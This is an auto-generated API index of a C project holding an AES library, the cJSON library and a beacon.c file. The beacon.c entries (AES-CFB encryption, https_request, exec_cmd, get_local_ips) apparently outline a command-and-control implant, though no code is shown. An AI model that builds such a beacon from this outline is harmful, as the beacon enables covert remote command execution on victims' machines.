# API

## aes.c

### getSBoxValue (function) `static uint8_t getSBoxValue(uint8_t num)`
- Defined: `aes.c:13`
- Depends on: `aes.h`

### getSBoxInvert (function) `static uint8_t getSBoxInvert(uint8_t num)`
- Defined: `aes.c:35`
- Depends on: `aes.h`

### Td0 (function) `static uint8_t Td0(int x)`
- Defined: `aes.c:57`
- Depends on: `aes.h`

### Td1 (function) `static uint8_t Td1(int x)`
- Defined: `aes.c:58`
- Depends on: `aes.h`

### Td2 (function) `static uint8_t Td2(int x)`
- Defined: `aes.c:59`
- Depends on: `aes.h`

### Td3 (function) `static uint8_t Td3(int x)`
- Defined: `aes.c:60`
- Depends on: `aes.h`

### Td4 (function) `static uint8_t Td4(int x)`
- Defined: `aes.c:61`
- Depends on: `aes.h`

### KeyExpansion (function) `static void KeyExpansion(uint8_t* RoundKey, const uint8_t* Key)`
- Defined: `aes.c:166`
- Doc: This function produces Nb(Nr+1) round keys. The round keys are used in each round to decrypt the states.
- Depends on: `aes.h`

### AES_init_ctx (function) `void AES_init_ctx(struct AES_ctx* ctx, const uint8_t* key)`
- Defined: `aes.c:239`
- Depends on: `aes.h`

### AES_init_ctx_iv (function) `void AES_init_ctx_iv(struct AES_ctx* ctx, const uint8_t* key, const uint8_t* iv)`
- Defined: `aes.c:244`
- Doc: if (defined(CBC) && (CBC == 1)) || (defined(CTR) && (CTR == 1))
- Depends on: `aes.h`

### AES_ctx_set_iv (function) `void AES_ctx_set_iv(struct AES_ctx* ctx, const uint8_t* iv)`
- Defined: `aes.c:249`
- Depends on: `aes.h`

### AddRoundKey (function) `static void AddRoundKey(uint8_t round, state_t* state, const uint8_t* RoundKey)`
- Defined: `aes.c:257`
- Doc: This function adds the round key to state. The round key is added to the state by an XOR function.
- Depends on: `aes.h`

### SubBytes (function) `static void SubBytes(state_t* state)`
- Defined: `aes.c:271`
- Doc: The SubBytes Function Substitutes the values in the state matrix with values in an S-box.
- Depends on: `aes.h`

### ShiftRows (function) `static void ShiftRows(state_t* state)`
- Defined: `aes.c:286`
- Doc: The ShiftRows() function shifts the rows in the state to the left. Each row is shifted with different offset. Offset = R
- Depends on: `aes.h`

### xtime (function) `static uint8_t xtime(uint8_t x)`
- Defined: `aes.c:314`
- Depends on: `aes.h`

### MixColumns (function) `static void MixColumns(state_t* state)`
- Defined: `aes.c:320`
- Doc: MixColumns function mixes the columns of the state matrix
- Depends on: `aes.h`

### Multiply (function) `static uint8_t Multiply(uint8_t x, uint8_t y)`
- Defined: `aes.c:340`
- Doc: Multiply is used to multiply numbers in the field GF(2^8) Note: The last call to xtime() is unneeded, but often ends up 
- Depends on: `aes.h`

### InvMixColumns (function) `static void InvMixColumns(state_t* state)`
- Defined: `aes.c:370`
- Doc: MixColumns function mixes the columns of the state matrix. The method used to multiply may be difficult to understand fo
- Depends on: `aes.h`

### InvSubBytes (function) `static void InvSubBytes(state_t* state)`
- Defined: `aes.c:391`
- Doc: The SubBytes Function Substitutes the values in the state matrix with values in an S-box.
- Depends on: `aes.h`

### InvShiftRows (function) `static void InvShiftRows(state_t* state)`
- Defined: `aes.c:403`
- Depends on: `aes.h`

### Cipher (function) `static void Cipher(state_t* state, const uint8_t* RoundKey)`
- Defined: `aes.c:433`
- Doc: Cipher is the main function that encrypts the PlainText.
- Depends on: `aes.h`

### InvCipher (function) `static void InvCipher(state_t* state, const uint8_t* RoundKey)`
- Defined: `aes.c:459`
- Doc: if (defined(CBC) && CBC == 1) || (defined(ECB) && ECB == 1)
- Depends on: `aes.h`

### AES_ECB_encrypt (function) `void AES_ECB_encrypt(const struct AES_ctx* ctx, uint8_t* buf)`
- Defined: `aes.c:490`
- Depends on: `aes.h`

### AES_ECB_decrypt (function) `void AES_ECB_decrypt(const struct AES_ctx* ctx, uint8_t* buf)`
- Defined: `aes.c:496`
- Depends on: `aes.h`

### XorWithIv (function) `static void XorWithIv(uint8_t* buf, const uint8_t* Iv)`
- Defined: `aes.c:512`
- Depends on: `aes.h`

### AES_CBC_encrypt_buffer (function) `void AES_CBC_encrypt_buffer(struct AES_ctx *ctx, uint8_t* buf, size_t length)`
- Defined: `aes.c:521`
- Depends on: `aes.h`

### AES_CBC_decrypt_buffer (function) `void AES_CBC_decrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length)`
- Defined: `aes.c:536`
- Depends on: `aes.h`

### AES_CTR_xcrypt_buffer (function) `void AES_CTR_xcrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length)`
- Defined: `aes.c:558`
- Doc: XorWithIv(buf, ctx->Iv); memcpy(ctx->Iv, storeNextIv, AES_BLOCKLEN); buf += AES_BLOCKLEN; } } #endif // #if defined(CBC)
- Depends on: `aes.h`

## aes.h

### AES_init_ctx (function) `void AES_init_ctx(struct AES_ctx* ctx, const uint8_t* key);`
- Defined: `aes.h:38`
- Imported by: `aes.c`, `beacon.c`

### AES_init_ctx_iv (function) `void AES_init_ctx_iv(struct AES_ctx* ctx, const uint8_t* key, const uint8_t* iv);`
- Defined: `aes.h:40`
- Doc: if (defined(CBC) && (CBC == 1)) || (defined(CTR) && (CTR == 1))
- Imported by: `aes.c`, `beacon.c`

### AES_ctx_set_iv (function) `void AES_ctx_set_iv(struct AES_ctx* ctx, const uint8_t* iv);`
- Defined: `aes.h:41`
- Imported by: `aes.c`, `beacon.c`

### AES_ECB_encrypt (function) `void AES_ECB_encrypt(const struct AES_ctx* ctx, uint8_t* buf);`
- Defined: `aes.h:45`
- Doc: if defined(ECB) && (ECB == 1)
- Imported by: `aes.c`, `beacon.c`

## beacon.c

### base64_encode (function) `char* base64_encode(const unsigned char* data, size_t input_length)`
- Defined: `beacon.c:50`
- Depends on: `aes.h`, `cJSON.h`

### base64_decode (function) `unsigned char* base64_decode(const char* data, size_t* out_len)`
- Defined: `beacon.c:76`
- Depends on: `aes.h`, `cJSON.h`

### aes256_cfb_encrypt (function) `unsigned char* aes256_cfb_encrypt(const unsigned char* key, const unsigned char* iv,
            ...`
- Defined: `beacon.c:118`
- Doc: === AES CFB ===
- Depends on: `aes.h`, `cJSON.h`

### aes256_cfb_decrypt (function) `unsigned char* aes256_cfb_decrypt(const unsigned char* key, const unsigned char* iv,
            ...`
- Defined: `beacon.c:146`
- Depends on: `aes.h`, `cJSON.h`

### WriteMemoryCallback (function) `static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)`
- Defined: `beacon.c:182`
- Depends on: `aes.h`, `cJSON.h`

### https_request (function) `char* https_request(const char* url, const char* method, const char* post_data)`
- Defined: `beacon.c:194`
- Depends on: `aes.h`, `cJSON.h`

### exec_cmd (function) `char* exec_cmd(const char* cmd, int* out_len)`
- Defined: `beacon.c:252`
- Doc: === EXEC CMD ===
- Depends on: `aes.h`, `cJSON.h`

### get_local_ips (function) `char* get_local_ips()`
- Defined: `beacon.c:297`
- Doc: === GET LOCAL IPs ===
- Depends on: `aes.h`, `cJSON.h`

### main (function) `int main()`
- Defined: `beacon.c:340`
- Doc: === MAIN ===
- Depends on: `aes.h`, `cJSON.h`

## cJSON.c

### CJSON_PUBLIC (function) `CJSON_PUBLIC(const char *) cJSON_GetErrorPtr(void)`
- Defined: `cJSON.c:95`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(char *) cJSON_GetStringValue(const cJSON * const item)`
- Defined: `cJSON.c:100`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(double) cJSON_GetNumberValue(const cJSON * const item)`
- Defined: `cJSON.c:110`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(const char*) cJSON_Version(void)`
- Defined: `cJSON.c:125`
- Depends on: `cJSON.h`

### case_insensitive_strcmp (function) `static int case_insensitive_strcmp(const unsigned char *string1, const unsigned char *string2)`
- Defined: `cJSON.c:134`
- Doc: /* This is a safeguard to prevent copy-pasters from using incompatible C and header files #if (CJSON_VERSION_MAJOR != 1)
- Depends on: `cJSON.h`

### internal_malloc (function) `static void * CJSON_CDECL internal_malloc(size_t size)`
- Defined: `cJSON.c:166`
- Doc: } return tolower(*string1) - tolower(*string2); } typedef struct internal_hooks { void *(CJSON_CDECL *allocate)(size_t s
- Depends on: `cJSON.h`

### internal_free (function) `static void CJSON_CDECL internal_free(void *pointer)`
- Defined: `cJSON.c:170`
- Depends on: `cJSON.h`

### internal_realloc (function) `static void * CJSON_CDECL internal_realloc(void *pointer, size_t size)`
- Defined: `cJSON.c:174`
- Depends on: `cJSON.h`

### cJSON_strdup (function) `static unsigned char* cJSON_strdup(const unsigned char* string, const internal_hooks * const hooks)`
- Defined: `cJSON.c:189`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(void) cJSON_InitHooks(cJSON_Hooks* hooks)`
- Defined: `cJSON.c:210`
- Depends on: `cJSON.h`

### cJSON_New_Item (function) `static cJSON *cJSON_New_Item(const internal_hooks * const hooks)`
- Defined: `cJSON.c:242`
- Doc: if (hooks->free_fn != NULL) { global_hooks.deallocate = hooks->free_fn; } /* use realloc only if both free and malloc ar
- Depends on: `cJSON.h`

### get_decimal_point (function) `static unsigned char get_decimal_point(void)`
- Defined: `cJSON.c:281`
- Doc: item->valuestring = NULL; } if (!(item->type & cJSON_StringIsConst) && (item->string != NULL)) { global_hooks.deallocate
- Depends on: `cJSON.h`

### parse_number (function) `static cJSON_bool parse_number(cJSON * const item, parse_buffer * const input_buffer)`
- Defined: `cJSON.c:309`
- Doc: size_t offset; size_t depth; /* How deeply nested (in arrays/objects) is the input at the current offset. internal_hooks
- Depends on: `cJSON.h`

### ensure (function) `static unsigned char* ensure(printbuffer * const p, size_t needed)`
- Defined: `cJSON.c:494`
- Doc: } typedef struct { unsigned char *buffer; size_t length; size_t offset; size_t depth; /* current nesting depth (for form
- Depends on: `cJSON.h`

### update_offset (function) `static void update_offset(printbuffer * const buffer)`
- Defined: `cJSON.c:579`
- Doc: p->buffer = NULL; return NULL; } memcpy(newbuffer, p->buffer, p->offset + 1); p->hooks.deallocate(p->buffer); } p->lengt
- Depends on: `cJSON.h`

### compare_double (function) `static cJSON_bool compare_double(double a, double b)`
- Defined: `cJSON.c:592`
- Doc: /* calculate the new length of the string in a printbuffer and update the offset static void update_offset(printbuffer *
- Depends on: `cJSON.h`

### print_number (function) `static cJSON_bool print_number(const cJSON * const item, printbuffer * const output_buffer)`
- Defined: `cJSON.c:599`
- Doc: } buffer_pointer = buffer->buffer + buffer->offset; buffer->offset += strlen((const char*)buffer_pointer); } /* securely
- Depends on: `cJSON.h`

### parse_hex4 (function) `static unsigned parse_hex4(const unsigned char * const input)`
- Defined: `cJSON.c:669`
- Doc: output_pointer[i] = '.'; continue; } output_pointer[i] = number_buffer[i]; } output_pointer[i] = '\0'; output_buffer->of
- Depends on: `cJSON.h`

### utf16_literal_to_utf8 (function) `static unsigned char utf16_literal_to_utf8(const unsigned char * const input_pointer, const unsig...`
- Defined: `cJSON.c:706`
- Doc: converts a UTF-16 literal to UTF-8 * A literal can be one or two sequences of the form \uXXXX
- Depends on: `cJSON.h`

### parse_string (function) `static cJSON_bool parse_string(cJSON * const item, parse_buffer * const input_buffer)`
- Defined: `cJSON.c:827`
- Doc: else { (*output_pointer)[0] = (unsigned char)(codepoint & 0x7F); } output_pointer += utf8_length; return sequence_length
- Depends on: `cJSON.h`

### print_string_ptr (function) `static cJSON_bool print_string_ptr(const unsigned char * const input, printbuffer * const output_...`
- Defined: `cJSON.c:957`
- Doc: { input_buffer->hooks.deallocate(output); output = NULL; } if (input_pointer != NULL) { input_buffer->offset = (size_t)(
- Depends on: `cJSON.h`

### print_string (function) `static cJSON_bool print_string(const cJSON * const item, printbuffer * const p)`
- Defined: `cJSON.c:1079`
- Doc: /* escape and print as unicode codepoint sprintf((char*)output_pointer, "u%04x", *input_pointer); output_pointer += 4; b
- Depends on: `cJSON.h`

### buffer_skip_whitespace (function) `static parse_buffer *buffer_skip_whitespace(parse_buffer * const buffer)`
- Defined: `cJSON.c:1093`
- Doc: static cJSON_bool print_string(const cJSON * const item, printbuffer * const p) { return print_string_ptr((unsigned char
- Depends on: `cJSON.h`

### skip_utf8_bom (function) `static parse_buffer *skip_utf8_bom(parse_buffer * const buffer)`
- Defined: `cJSON.c:1119`
- Doc: while (can_access_at_index(buffer, 0) && (buffer_at_offset(buffer)[0] <= 32)) { buffer->offset++; } if (buffer->offset =
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_ParseWithOpts(const char *value, const char **return_parse_end, cJSON...`
- Defined: `cJSON.c:1134`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_ParseWithLength(const char *value, size_t buffer_length)`
- Defined: `cJSON.c:1236`
- Depends on: `cJSON.h`

### print (function) `static unsigned char *print(const cJSON * const item, cJSON_bool format, const internal_hooks * c...`
- Defined: `cJSON.c:1243`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(char *) cJSON_PrintUnformatted(const cJSON *item)`
- Defined: `cJSON.c:1316`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(char *) cJSON_PrintBuffered(const cJSON *item, int prebuffer, cJSON_bool fmt)`
- Defined: `cJSON.c:1321`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_PrintPreallocated(cJSON *item, char *buffer, const int length, con...`
- Defined: `cJSON.c:1352`
- Depends on: `cJSON.h`

### parse_value (function) `static cJSON_bool parse_value(cJSON * const item, parse_buffer * const input_buffer)`
- Defined: `cJSON.c:1372`
- Doc: return false; } p.buffer = (unsigned char*)buffer; p.length = (size_t)length; p.offset = 0; p.noalloc = true; p.format =
- Depends on: `cJSON.h`

### print_value (function) `static cJSON_bool print_value(const cJSON * const item, printbuffer * const output_buffer)`
- Defined: `cJSON.c:1427`
- Doc: if (can_access_at_index(input_buffer, 0) && (buffer_at_offset(input_buffer)[0] == '[')) { return parse_array(item, input
- Depends on: `cJSON.h`

### parse_array (function) `static cJSON_bool parse_array(cJSON * const item, parse_buffer * const input_buffer)`
- Defined: `cJSON.c:1501`
- Doc: return print_string(item, output_buffer); case cJSON_Array: return print_array(item, output_buffer); case cJSON_Object: 
- Depends on: `cJSON.h`

### print_array (function) `static cJSON_bool print_array(const cJSON * const item, printbuffer * const output_buffer)`
- Defined: `cJSON.c:1599`
- Doc: input_buffer->offset++; return true; fail: if (head != NULL) { cJSON_Delete(head); } return false; } /* Render an array 
- Depends on: `cJSON.h`

### parse_object (function) `static cJSON_bool parse_object(cJSON * const item, parse_buffer * const input_buffer)`
- Defined: `cJSON.c:1661`
- Doc: output_pointer = ensure(output_buffer, 2); if (output_pointer == NULL) { return false; } output_pointer++ = ']'; output_
- Depends on: `cJSON.h`

### print_object (function) `static cJSON_bool print_object(const cJSON * const item, printbuffer * const output_buffer)`
- Defined: `cJSON.c:1780`
- Doc: input_buffer->offset++; return true; fail: if (head != NULL) { cJSON_Delete(head); } return false; } /* Render an object
- Depends on: `cJSON.h`

### get_array_item (function) `static cJSON* get_array_item(const cJSON *array, size_t index)`
- Defined: `cJSON.c:1916`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_GetArrayItem(const cJSON *array, int index)`
- Defined: `cJSON.c:1935`
- Depends on: `cJSON.h`

### get_object_item (function) `static cJSON *get_object_item(const cJSON * const object, const char * const name, const cJSON_bo...`
- Defined: `cJSON.c:1945`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_GetObjectItem(const cJSON * const object, const char * const string)`
- Defined: `cJSON.c:1977`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_GetObjectItemCaseSensitive(const cJSON * const object, const char * c...`
- Defined: `cJSON.c:1982`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_HasObjectItem(const cJSON *object, const char *string)`
- Defined: `cJSON.c:1987`
- Depends on: `cJSON.h`

### suffix_object (function) `static void suffix_object(cJSON *prev, cJSON *item)`
- Defined: `cJSON.c:1993`
- Doc: return get_object_item(object, string, false); } CJSON_PUBLIC(cJSON *) cJSON_GetObjectItemCaseSensitive(const cJSON * co
- Depends on: `cJSON.h`

### create_reference (function) `static cJSON *create_reference(const cJSON *item, const internal_hooks * const hooks)`
- Defined: `cJSON.c:2000`
- Doc: CJSON_PUBLIC(cJSON_bool) cJSON_HasObjectItem(const cJSON *object, const char *string) { return cJSON_GetObjectItem(objec
- Depends on: `cJSON.h`

### add_item_to_array (function) `static cJSON_bool add_item_to_array(cJSON *array, cJSON *item)`
- Defined: `cJSON.c:2021`
- Depends on: `cJSON.h`

### cast_away_const (function) `static void* cast_away_const(const void* string)`
- Defined: `cJSON.c:2066`
- Doc: /* Add item to array/object. CJSON_PUBLIC(cJSON_bool) cJSON_AddItemToArray(cJSON *array, cJSON *item) { return add_item_
- Depends on: `cJSON.h`

### add_item_to_object (function) `static cJSON_bool add_item_to_object(cJSON * const object, const char * const string, cJSON * con...`
- Defined: `cJSON.c:2075`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_AddItemToObject(cJSON *object, const char *string, cJSON *item)`
- Defined: `cJSON.c:2112`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_AddItemReferenceToArray(cJSON *array, cJSON *item)`
- Defined: `cJSON.c:2123`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_AddItemReferenceToObject(cJSON *object, const char *string, cJSON ...`
- Defined: `cJSON.c:2133`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON*) cJSON_AddNullToObject(cJSON * const object, const char * const name)`
- Defined: `cJSON.c:2143`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON*) cJSON_AddTrueToObject(cJSON * const object, const char * const name)`
- Defined: `cJSON.c:2155`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON*) cJSON_AddFalseToObject(cJSON * const object, const char * const name)`
- Defined: `cJSON.c:2167`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON*) cJSON_AddBoolToObject(cJSON * const object, const char * const name, const c...`
- Defined: `cJSON.c:2179`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON*) cJSON_AddNumberToObject(cJSON * const object, const char * const name, const...`
- Defined: `cJSON.c:2191`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON*) cJSON_AddStringToObject(cJSON * const object, const char * const name, const...`
- Defined: `cJSON.c:2203`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON*) cJSON_AddRawToObject(cJSON * const object, const char * const name, const ch...`
- Defined: `cJSON.c:2215`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON*) cJSON_AddObjectToObject(cJSON * const object, const char * const name)`
- Defined: `cJSON.c:2227`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON*) cJSON_AddArrayToObject(cJSON * const object, const char * const name)`
- Defined: `cJSON.c:2239`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_DetachItemViaPointer(cJSON *parent, cJSON * const item)`
- Defined: `cJSON.c:2251`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_DetachItemFromArray(cJSON *array, int which)`
- Defined: `cJSON.c:2287`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(void) cJSON_DeleteItemFromArray(cJSON *array, int which)`
- Defined: `cJSON.c:2297`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_DetachItemFromObject(cJSON *object, const char *string)`
- Defined: `cJSON.c:2302`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_DetachItemFromObjectCaseSensitive(cJSON *object, const char *string)`
- Defined: `cJSON.c:2309`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(void) cJSON_DeleteItemFromObject(cJSON *object, const char *string)`
- Defined: `cJSON.c:2316`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(void) cJSON_DeleteItemFromObjectCaseSensitive(cJSON *object, const char *string)`
- Defined: `cJSON.c:2321`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_ReplaceItemViaPointer(cJSON * const parent, cJSON * const item, cJ...`
- Defined: `cJSON.c:2363`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_ReplaceItemInArray(cJSON *array, int which, cJSON *newitem)`
- Defined: `cJSON.c:2413`
- Depends on: `cJSON.h`

### replace_item_in_object (function) `static cJSON_bool replace_item_in_object(cJSON *object, const char *string, cJSON *replacement, c...`
- Defined: `cJSON.c:2423`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_ReplaceItemInObject(cJSON *object, const char *string, cJSON *newi...`
- Defined: `cJSON.c:2446`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_ReplaceItemInObjectCaseSensitive(cJSON *object, const char *string...`
- Defined: `cJSON.c:2451`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateTrue(void)`
- Defined: `cJSON.c:2468`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateFalse(void)`
- Defined: `cJSON.c:2479`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateBool(cJSON_bool boolean)`
- Defined: `cJSON.c:2490`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateNumber(double num)`
- Defined: `cJSON.c:2501`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateString(const char *string)`
- Defined: `cJSON.c:2526`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateStringReference(const char *string)`
- Defined: `cJSON.c:2543`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateObjectReference(const cJSON *child)`
- Defined: `cJSON.c:2555`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateArrayReference(const cJSON *child)`
- Defined: `cJSON.c:2567`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateRaw(const char *raw)`
- Defined: `cJSON.c:2579`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateArray(void)`
- Defined: `cJSON.c:2596`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateObject(void)`
- Defined: `cJSON.c:2607`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateFloatArray(const float *numbers, int count)`
- Defined: `cJSON.c:2659`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateDoubleArray(const double *numbers, int count)`
- Defined: `cJSON.c:2699`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON *) cJSON_CreateStringArray(const char *const *strings, int count)`
- Defined: `cJSON.c:2739`
- Depends on: `cJSON.h`

### cJSON_Duplicate_rec (function) `cJSON * cJSON_Duplicate_rec(const cJSON *item, size_t depth, cJSON_bool recurse)`
- Defined: `cJSON.c:2786`
- Depends on: `cJSON.h`

### skip_oneline_comment (function) `static void skip_oneline_comment(char **input)`
- Defined: `cJSON.c:2873`
- Depends on: `cJSON.h`

### skip_multiline_comment (function) `static void skip_multiline_comment(char **input)`
- Defined: `cJSON.c:2886`
- Depends on: `cJSON.h`

### minify_string (function) `static void minify_string(char **input, char **output)`
- Defined: `cJSON.c:2900`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(void) cJSON_Minify(char *json)`
- Defined: `cJSON.c:2922`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_IsInvalid(const cJSON * const item)`
- Defined: `cJSON.c:2972`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_IsFalse(const cJSON * const item)`
- Defined: `cJSON.c:2982`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_IsTrue(const cJSON * const item)`
- Defined: `cJSON.c:2992`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_IsBool(const cJSON * const item)`
- Defined: `cJSON.c:3002`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_IsNull(const cJSON * const item)`
- Defined: `cJSON.c:3012`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_IsNumber(const cJSON * const item)`
- Defined: `cJSON.c:3022`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_IsString(const cJSON * const item)`
- Defined: `cJSON.c:3032`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_IsArray(const cJSON * const item)`
- Defined: `cJSON.c:3042`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_IsObject(const cJSON * const item)`
- Defined: `cJSON.c:3052`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_IsRaw(const cJSON * const item)`
- Defined: `cJSON.c:3062`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(cJSON_bool) cJSON_Compare(const cJSON * const a, const cJSON * const b, const cJSON_...`
- Defined: `cJSON.c:3072`
- Depends on: `cJSON.h`

### cJSON_ArrayForEach (function) `cJSON_ArrayForEach(a_element, a)`
- Defined: `cJSON.c:3157`
- Depends on: `cJSON.h`

### cJSON_ArrayForEach (function) `cJSON_ArrayForEach(b_element, b)`
- Defined: `cJSON.c:3173`
- Doc: doing this twice, once on a and b to prevent true comparison if a subset of b * TODO: Do this the proper way, this is ju
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(void *) cJSON_malloc(size_t size)`
- Defined: `cJSON.c:3194`
- Depends on: `cJSON.h`

### CJSON_PUBLIC (function) `CJSON_PUBLIC(void) cJSON_free(void *object)`
- Defined: `cJSON.c:3199`
- Depends on: `cJSON.h`

## cJSON.h

### sensitive (function) `* case_sensitive determines if object keys are treated case sensitive (1) or case insensitive (0) */ CJSON_PUBLIC(cJSON_bool) cJSON_Compare(const cJSON * const a, const cJSON * const b, const cJSON_bo`
- Defined: `cJSON.h:249`
- Imported by: `beacon.c`, `cJSON.c`
